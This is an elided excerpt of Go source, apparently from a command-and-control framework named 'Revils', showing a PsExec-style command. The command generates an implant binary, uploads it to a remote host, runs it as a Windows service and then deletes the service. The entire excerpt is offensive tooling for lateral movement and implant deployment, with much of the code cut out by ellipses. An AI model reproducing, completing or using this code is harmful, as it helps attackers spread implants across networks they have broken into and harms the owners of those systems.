...
func PsExecCmd(ctx *grumble.Context, con *console.RevilsConsoleClient) {
	...
	if serviceName == "Revils" || serviceDesc == "Revils implant" {
	...
	if customExe == "" {
		...
		con.SpinUntil(fmt.Sprintf("Generating revils binary for %s\n", profile), generateCtrl)
		...
		serviceBinary, _ = generate.GetRevilsBinary(implantProfile, con)
	} else {
		// use a custom exe instead of generating a new Revils
	...
	upload, err := con.Rpc.Upload(context.Background(), &revilspb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    filePath,
	...
	start, err := con.Rpc.StartService(context.Background(), &revilspb.StartServiceReq{
		BinPath:            binaryPath,
		Hostname:           hostname,
		Request:            con.ActiveTarget.Request(ctx),
	...
	removed, err := con.Rpc.RemoveService(context.Background(), &revilspb.RemoveServiceReq{
		ServiceInfo: &revilspb.ServiceInfoReq{
			Hostname:    hostname,
			ServiceName: serviceName,
		},
		Request: con.ActiveTarget.Request(ctx),
